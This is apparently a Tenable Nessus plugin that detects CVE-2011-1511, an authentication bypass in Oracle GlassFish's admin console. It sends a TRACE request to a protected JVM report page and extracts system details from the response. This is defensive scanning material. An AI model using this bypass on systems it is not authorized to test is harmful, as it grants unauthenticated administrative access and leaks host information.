#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(53876);
  script_version("1.12");
  script_cvs_date("Date: 2018/11/15 20:50:25");

  script_cve_id("CVE-2011-1511");
  script_bugtraq_id(47818);
  script_xref(name:"EDB-ID", value:"17276");

  script_name(english:"Oracle GlassFish Server Administrative Console Authentication Bypass");
  script_summary(english:"Bypasses authentication, access a page containing system information");

  script_set_attribute(
    attribute:"synopsis",
    value:"The remote web server has an authentication bypass vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of GlassFish Server running on the remote host has an
authentication bypass vulnerability.  The server treats specially
crafted TRACE requests as if they are authenticated GET requests. 

A remote, unauthenticated attacker could exploit this to bypass
authentication and gain administrative access to the affected
application.  In turn, this could be leveraged to run commands under
the context of the GlassFish server, which is root by default."
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?d4119099"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"https://www.securityfocus.com/archive/1/517965/30/0/threaded"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"https://www.securityfocus.com/archive/1/521120/30/0/threaded"
  );
  script_set_attribute(
    attribute:"solution",
    value:
"Upgrade to GlassFish Server 3.1 or later, or disable TRACE (refer to
the Core Security advisory for more information)."
  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/05/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/02/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/05/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:glassfish_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2011-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("glassfish_console_detect.nasl");
  script_require_keys("www/glassfish", "www/glassfish/console");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("glassfish.inc");

#
# Main
#

# Check GlassFish & GlassFish Admin Console
get_kb_item_or_exit('www/glassfish');
get_kb_item_or_exit('www/glassfish/console');

port = get_glassfish_console_port(default:4848);

url = '/common/appServer/jvmReport.jsf';
res = get_glassfish_res(method:'TRACE', port:port, url:url, exit_on_fail:TRUE);

if ('java.version' >!< res[2])
  exit(0, 'Unable to get JVM version from port '+port+', host probably isn\'t affected.');

if (report_verbosity > 0)
{
  report = '\nNessus was able to access "' + url + '"' +
           '\nby making the following request :\n\n' +
           crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n'+
           http_last_sent_request() +
           crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30)+'\n';

  # try to extract/report system info when verbose
  if (report_verbosity > 1)
  {
    patterns = make_array(
      'Operating System', 'Name of the Operating System: (.+)',
      'Architecture', 'Binary Architecture name of the Operating System: (.+),',
      'JVM version', 'java.version = (.+)',
      'GlassFish Path', 'com.sun.aas.installRoot = (.+)'
    );

    info = NULL;

    foreach label (keys(patterns))
    {
      pattern = patterns[label];
      match = eregmatch(string:res[2], pattern:pattern);
      if (isnull(match)) continue;
      info += '  '+label+' : '+match[1]+'\n';
    }

    if (!isnull(info))
      report += '\nThis page contains system information such as :\n\n' + info;
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
